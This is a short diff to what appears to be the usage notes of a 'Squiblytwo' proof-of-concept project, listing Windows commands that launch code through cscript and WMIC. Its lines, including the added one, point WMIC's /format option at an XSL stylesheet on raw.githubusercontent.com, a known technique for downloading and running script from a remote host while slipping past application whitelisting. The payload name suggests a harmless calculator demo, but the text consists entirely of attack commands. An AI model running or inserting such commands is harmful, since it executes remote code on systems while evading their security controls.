@@ -12,3 +12,4 @@ C:\Windows\SysWOW64\cscript.exe C:\Users\analyticsearch\CodeLauncher.js
 *** Execute ***
 C:\Windows\SysWOW64\wbem\WMIC.exe os get /format:"C:\Users\analyticsearch\CodeLauncher.xsl" && exit
 C:\Windows\SysWOW64\wbem\WMIC.exe os get /format:"https://raw.githubusercontent.com/analyticsearch/Squiblytwo/master/CodeLauncherCalc.xsl" && exit
+C:\Windows\SysWOW64\wbem\WMIC.exe process get brief /format:"https://raw.githubusercontent.com/analyticsearch/Squiblytwo/master/CodeLauncherCalc.xsl" && exit
